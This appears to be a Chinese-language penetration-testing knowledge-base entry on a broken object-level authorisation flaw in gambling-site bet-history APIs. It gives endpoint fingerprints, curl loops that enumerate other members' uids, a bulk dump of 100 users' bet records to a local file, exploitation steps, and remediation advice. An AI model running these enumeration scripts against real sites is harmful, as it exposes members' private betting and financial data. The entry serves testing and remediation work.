---
title: 注单 / 流水接口越权批量拉取（全站会员数据）
cve: 无（业务逻辑）
severity: high
cvss: 8.6
product: 自研注单与报表接口（博彩）
versions: 任意
ports: 80, 443
keywords: 注单, 流水, idor, 越权, 批量, 报表
entry: /api/bet/list?uid=  /api/report/bet
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
GET /api/bet/list?uid=1001&page=1&size=20
GET /api/report/bet?startDate=..&endDate=..
GET /api/order/history?memberId=
```

## 前置条件

- 普通会员 token；接口带 uid/memberId 参数。

## PoC

```bash
# 1) 自己的注单（基线）
curl -s 'https://target/api/bet/list?uid=<自己>&page=1&size=20' -H "Authorization: Bearer <t>" | head -c 300

# 2) 换 uid 遍历他人
for u in 1001 1002 1003; do
  echo "== $u"
  curl -s "https://target/api/bet/list?uid=$u&page=1&size=20" -H "Authorization: Bearer <t>" | head -c 200
done
# 判定：返回他人注单（含 betAmount/win/lose）= 命中

# 3) 批量（限速，别打崩）
for u in $(seq 1001 1100); do curl -s "https://target/api/bet/list?uid=$u&size=100" -H "Authorization: Bearer <t>" >> /tmp/bets.jsonl; done
wc -l /tmp/bets.jsonl
```

## 利用步骤

1. 先做 2（单用户对比），确认无行级鉴权；
2. 再小批量（100 个 uid）证明规模，不要全站拉；
3. 数据能反推会员资金与代理结构——作为影响面证据；
4. 证据：他人 uid 的注单响应（打码手机号/卡号）。

## 修复与缓解

- 接口按 token 里的 uid 过滤，忽略请求里的 uid；代理只看自己下级。
- 加访问频次限制与审计。

## 参考

- OWASP API Security Top 10 API1 BOLA。
